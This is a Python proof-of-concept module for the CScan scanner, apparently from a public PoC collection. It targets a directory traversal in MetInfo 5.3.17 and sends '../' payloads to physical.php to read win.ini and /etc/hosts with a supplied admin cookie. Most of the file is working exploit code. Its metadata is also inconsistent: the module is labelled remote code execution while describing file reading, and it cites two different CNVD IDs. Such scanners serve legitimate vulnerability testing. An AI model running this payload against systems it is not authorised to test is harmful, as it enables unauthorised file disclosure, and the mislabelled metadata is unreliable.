# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'MetInfo_0007_L'  # 平台漏洞编号
    name = 'Metinfo远程代码执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2018-07-24'  # 漏洞公布时间
    desc = '''
    MetInfo 5.3.17版本中存在目录遍历漏洞。远程攻击者可利用该漏洞读取ini格式文件中的信息。 
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2017-34703'
    cnvd_id = 'CNVD-2018-13848'  # cnvd漏洞编号
    cve_id = 'CVE-2017-14513'  # cve编号
    product = 'MetInfo'  # 漏洞组件名称
    product_version = '5.3.17'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '32e9df69-337b-4869-9a61-657d4d51e1f4'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-07-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                },
                'cookie': {
                    'type': 'string',
                    'description': '登录cookie',
                    'default': '',
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            headers = {
                'Cookie': self.get_option('cookie'),
                'Content-Type': 'application/x-www-form-urlencoded',
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
            }
            self.output.info('正在尝试读取系统下敏感文件信息')
            # 针对不同平台下构造对应的payload
            win_payload = "/admin/app/physical/physical.php?action=fingerprintdo&f_filename=../../../../../../../../../../Windows/win.ini"
            linux_payload = "/admin/app/physical/physical.php?action=fingerprintdo&f_filename=../../../../../../../../../etc/hosts"
            win_url = arg + win_payload
            linux_url = arg + linux_payload

            win_reponse = requests.get(win_url, headers=headers)
            linux_response = requests.get(linux_url, headers=headers)

            # 验证是否成功触发了目录遍历
            if win_reponse.status_code == 200 and 'extensions' in win_reponse.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
            if linux_response.status_code == 200 and 'hosts' in linux_response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
